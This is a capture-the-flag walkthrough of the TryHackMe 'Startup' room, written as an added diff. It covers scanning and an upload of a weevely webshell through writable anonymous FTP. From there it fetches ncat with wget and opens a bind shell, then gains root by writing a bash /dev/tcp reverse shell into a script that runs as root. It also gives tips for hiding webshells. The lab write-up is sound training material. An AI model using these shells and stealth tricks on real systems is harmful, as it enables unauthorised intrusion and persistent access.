@@ -1,0 +1,444 @@
+
+		███████╗████████╗ █████╗ ██████╗ ████████╗██╗   ██╗██████╗ 
+		██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██╔══██╗
+		███████╗   ██║   ███████║██████╔╝   ██║   ██║   ██║██████╔╝
+		╚════██║   ██║   ██╔══██║██╔══██╗   ██║   ██║   ██║██╔═══╝ 
+		███████║   ██║   ██║  ██║██║  ██║   ██║   ╚██████╔╝██║     
+		╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     
+
+	       Abuse traditional vulnerabilities via untraditional means
+
+https://tryhackme.com/room/startup
+
+--[ 1 ]-- Basic Enumeration
+
+To begin this CTF challenege we're going to do some basic enumeration on the box.
+Here i start with an nmap scan, then move onto a gobuster dir bruteforce to check for
+paths on the webserver and then i use nikto for good measure in the background to see
+if it can find anything of possible interest.
+
+--[nmap]--
+
+nmap: sudo nmap -sC -sV -A 10.10.148.13
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.11.52.160
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Maintenance
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+From the nmap output we can see that ftp, ssh and port 80 are running. 
+This shows that it's a webserver running on port 80 so we'll navigate to that
+in our browser, port 22 which is ssh so we'll put this in our back pocket if
+we find credentials, keys or usernames and port 21 which is ftp. Now with ftp
+nmaps shows us that it allows authentication using the anonymous user and
+more importantly there is a writeable directory so im already thinking that
+i can upload a webshell here and spawn a netcat bind shell off that.
+
+--[GoBuster]--
+
+GoBuster: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.148.13 -t 4
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.148.13
+[+] Method:                  GET
+[+] Threads:                 4
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/08/01 01:41:02 Starting gobuster in directory enumeration mode
+===============================================================
+/files                (Status: 301) [Size: 312] [--> http://10.10.148.13/files/]
+
+Visiting the IP address shows a webpage of little interest and no links to click through.
+So my first thought is to bruteforce direcotories to see if other paths exist on the box.
+
+Gobuster shows /files exists so we navigate to that and find a directory listing of a ftp directory
+an image of no importance and a text file of no importance. From the earlier nmap results i know
+that i can access the ftp with the anonymous user and i can write to the ftp directory so lets upload
+a webshell, for this im going to use weevely.
+
+--[Nikto]--
+
+Nikto is great to run in the background to look for misconfigurations,
+possible paths and files. So we run 'nikto -h 10.10.66.130' and let it
+run while we do other things and look back at it when it has finished.
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.66.130
++ Target Hostname:    10.10.66.130
++ Target Port:        80
++ Start Time:         2022-08-01 18:56:32 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 328, size: 5b3e1b06be884, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /files/: Directory indexing found.
++ OSVDB-3092: /files/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-08-01 19:01:05 (GMT1) (273 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+From nikto nothing special comes up but always worth a try.
+
+--[Weevely]--
+
+Weevely: weevely generate root ~/shell.php
+Output: Generated '/home/kali/shell.php' with password 'root' of 754 byte size.
+
+--[Upload webshell via FTP]--
+
+Connect: ftp 10.10.148.13
+              
+Connected to 10.10.148.13.
+220 (vsFTPd 3.0.3)
+Name (10.10.148.13:kali): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+!               bye             delete          features        help            macdef          mode            nmap            preserve        rate            rhelp           size            trace
+$               case            dir             fget            idle            mdelete         modtime         ntrans          progress        rcvbuf          rmdir           sndbuf          type
+?               cd              disconnect      form            image           mdir            more            open            prompt          recv            rstatus         status          umask
+account         cdup            edit            ftp             lcd             mget            mput            page            proxy           reget           runique         struct          unset
+append          chmod           epsv            gate            less            mkdir           mreget          passive         put             remopts         send            sunique         usage
+ascii           close           epsv4           get             lpage           mls             msend           pdir            pwd             rename          sendport        system          user
+bell            cr              epsv6           glob            lpwd            mlsd            newer           pls             quit            reset           set             tenex           verbose
+binary          debug           exit            hash            ls              mlst            nlist           pmlsd           quote           restart         site            throttle        xferbuf
+
+ftp> ls
+229 Entering Extended Passive Mode (|||40480|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
+-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+226 Directory send OK.
+
+ftp> cd ftp
+250 Directory successfully changed.
+
+ftp> put shell.php
+local: shell.php remote: shell.php
+229 Entering Extended Passive Mode (|||32063|)
+150 Ok to send data.
+100% |***********************************************************************************************************************************************************************************************|   754       14.67 MiB/s    00:00 ETA
+226 Transfer complete.
+754 bytes sent in 00:00 (16.67 KiB/s)
+
+ftp> ls
+229 Entering Extended Passive Mode (|||43318|)
+150 Here comes the directory listing.
+-rwxrwxr-x    1 112      118           754 Aug 01 00:46 shell.php
+226 Directory send OK.
+ftp> exit
+
+Here i logged into ftp with the anonymous user, changed to the writeable 
+directory that nmap showed me and used the 'put' command to upload the 
+webshell i created with weevely.
+
+--[Connecting to webshell]--
+
+Now lets connect to the webshell we just uploaded through ftp and start moving around on the box.
+
+In our browser lets navigate to: http://10.10.148.13/files/ftp/shell.php. The page is just white 
+and empty and this because php is server side code and not client side so as long as you see an empty page
+you're good. You could also put "404 not found" or something custom to avoid suspicion and you could
+inject weevely into legitamate pages to avoid detection and of course dont call the shell "shell.php" for stealth.
+
+Weevely: weevely http://10.10.148.13/files/ftp/shell.php root
+
+[+] weevely 4.0.1
+
+[+] Target:     10.10.148.13
+[+] Session:    /home/kali/.weevely/sessions/10.10.148.13/shell_0.session
+
+[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.
+
+weevely> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@startup:/var/www/html/files/ftp $
+
+Weevely is a great webshell but not as good as the real thing!
+
+Using weevely we download a netcat binary from github [1] and make it executable with 'chmod +x'.
+We want to be able to make use of the -e flag to create a bind shell.
+
+[1] https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat
+
+On our host machine do: 'python -m http.server' and in weeely on target do: 'cd /tmp && wget http://10.11.52.160:8000/ncat'.
+Now lets mark it as executable and run it. Do 'chmod +x ncat' to make it executable and do the following to start the
+bind shell:
+
+Bindshell: ./ncat -l -p 8080 -e /bin/bash
+Host machine: nc 10.10.148.13 8080 -v
+
+Now that we have a netcat session lets stabilise it with python. 
+Do: python -c 'import pty; pty.spawn("/bin/bash")'
+
+We should now have a familiar prompt:
+
+www-data@startup:/tmp$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+-[Questions]--
+
+Okay so now that were on the box and have our shell set up the next thing to do is answer
+the following questions (3) questions.
+
+--[Question 01]--
+01: What is the secret spicy soup recipe?
+
+For this it was super easy just change directory to the home direcotry
+do 'ls -la'.
+
+ls -la
+total 100
+drwxr-xr-x  25 root     root      4096 Aug  1 00:35 .
+drwxr-xr-x  25 root     root      4096 Aug  1 00:35 ..
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
+drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
+drwxr-xr-x  16 root     root      3560 Aug  1 00:35 dev
+drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
+drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
+drwx------   2 root     root     16384 Sep 25  2020 lost+found
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
+dr-xr-xr-x 134 root     root         0 Aug  1 00:35 proc
+-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt <---- FOUND IT
+drwx------   4 root     root      4096 Nov 12  2020 root
+drwxr-xr-x  25 root     root       920 Aug  1 00:59 run
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
+dr-xr-xr-x  13 root     root         0 Aug  1 00:35 sys
+drwxrwxrwt   7 root     root      4096 Aug  1 01:13 tmp
+drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
+drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
+
+simply cat recipe.txt and then that's the first answer successfully completed.
+
+--[Question 02]--
+02: What are the contents of user.txt?
+
+The first thing i tried was 'find / -type f -name "user.txt"' and it did not return the user.txt file
+so then i start to think if the user.txt file doesnt exist under the current user which is www-data then
+we need to move into another users account and see if user.txt is in there. For this i first tried to
+'cat /etc/passwd' and then collect all of the usernames and did a bruteforce using hydra against ssh 
+using the rockyou.txt password list but this did not return any low hanging fruits. So i keep looking
+around until i find a directory called /incidents. So lets 'cd incidents' and see whats in there.
+
+cd incidents && ls -la:
+total 40
+drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
+drwxr-xr-x 25 root     root      4096 Aug  1 00:35 ..
+-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng <---- STANDS OUT SO IS OF INTEREST
+
+Im not sure what the file extention is on this file '.pcapng' so i run 'file' over it:
+Cmd: 'file suspicious.pcapng'
+Output: pcap-ng capture file - version 1.0
+
+Google says the following:
+
+"Capture files contain summary information for every Internet packet received or transmitted 
+on the interface to help diagnose problems in the system."
+
+So already im thinking to use wireshark but im naturally lazy so first lets cat the file open
+and see if we can get any quick wins. After using cat to open the file i see a raw log and 
+analyzing the log contents i see possible credentials.
+
+Now i have what i think are credentials i need a user. For this I have a collected username
+list i created with /etc/passwd however lets first look in the home direcotry to see any users
+in there firist. Do:
+
+cd /home && ls -la:
+total 12
+drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
+drwxr-xr-x 25 root   root   4096 Aug  1 00:35 ..
+drwx------  4 lennie lennie 4096 Nov 12  2020 lennie <---- FOUND ARE USER
+
+The only user that's in the home direcotry is lennie so lets try to ssh into lennie with
+the possible credentials we have found in the log from before.
+
+SSH into lennie: ssh lennie@10.10.148.13
+
+lennie@10.10.148.13's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+44 packages can be updated.
+30 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+lennie@startup:~$ id
+uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
+
+SUCCESS! It worked. We have now sucesfully ssh'd into the user lennie. Looking
+around we see the user.txt file and thats our first flag captured!
+
+$ id 
+uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
+$ ls -la
+total 24
+drwx------ 5 lennie lennie 4096 Aug  1 18:26 .
+drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
+drwx------ 2 lennie lennie 4096 Aug  1 18:26 .cache
+drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
+-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt <---- FLAG 2 CAPTURED
+
+--[Question 03]--
+
+What are the contents of root.txt?
+
+Now for question three we need to pwn this box entirely and get root
+and retrieve the root.txt flag. As standard practice i do:
+'find / -type f -name "root.txt"' and again i dont find the root.txt
+flag and this is of course because we are not yet root. So lets look around
+the system. First thing i try is 'sudo -l' but this doesnt work so the next thing
+i do is run linpeas which also doesnt help much.
+
+Listing lennies current directory /home/lennie i see a directory called scripts.
+In /scripts are two scripts called:
+
+$ ls -la
+total 16
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
+drwx------ 5 lennie lennie 4096 Aug  1 18:26 ..
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 Aug  1 18:30 startup_list.txt
+
+We cant write to these files so they're no good for us. However we can read them.
+startup_list.txt shows nothing but planner.sh shows the following:
+
+$ cat planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+
+I see another file it calls to in /etc called print.sh. the file reads:
+
+$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+
+We investigate further and find out that our current user can write to this file.
+We know that the planner.sh script runs as root and looking at the process tree we
+can see:
+
+$ ps aux | grep "planner.sh"
+lennie    1759  0.0  0.1  12940  1032 pts/0    S+   18:34   0:00 grep planner.sh
+
+$ ps aux | grep "print.sh"
+lennie    1753  0.0  0.0  12940   928 pts/0    S+   18:33   0:00 grep print.sh
+
+So immediately i think if we write to print.sh then planner.sh will call print.sh and execute 
+the file as root. So lets go to [2] and grab a bash reverse shell, write the shell to print.sh,
+set our netcat listener (nc -lvnp 4444) and see what happens.
+
+[2] https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
+
+We do:
+
+$ cd /etc && pwd
+/etc
+
+$ echo '#!/usr/bin/env bash bash -i >& /dev/tcp/10.10.66.130/4444 0>&1' > print.sh
+
+$ cat print.sh
+bash -i >& /dev/tcp/10.11.52.160/4444 0>&1
+
+nc -lvnp 4444          
+listening on [any] 4444 ...
+
+Now we wait...
+
+connect to [10.11.52.160] from (UNKNOWN) [10.10.66.130] 50128
+bash: cannot set terminal process group (1960): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# id      
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+IT WORKED! Success!
+
+We now list out the current directory:
+
+root@startup:~# ls -la
+ls -la
+total 28
+drwx------  4 root root 4096 Nov 12  2020 .
+drwxr-xr-x 25 root root 4096 Aug  1 17:49 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   38 Nov 12  2020 root.txt <---- FLAG 3 CAPTURED
+drwx------  2 root root 4096 Nov 12  2020 .ssh
+
+We now find root.txt in the root user directory. Catting out the file shows us the flag.
+
+		███████╗██╗███╗   ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+		██╔════╝██║████╗  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
+		█████╗  ██║██╔██╗ ██║██║███████╗███████║█████╗  ██║  ██║
+		██╔══╝  ██║██║╚██╗██║██║╚════██║██╔══██║██╔══╝  ██║  ██║
+		██║     ██║██║ ╚████║██║███████║██║  ██║███████╗██████╔╝
+		╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
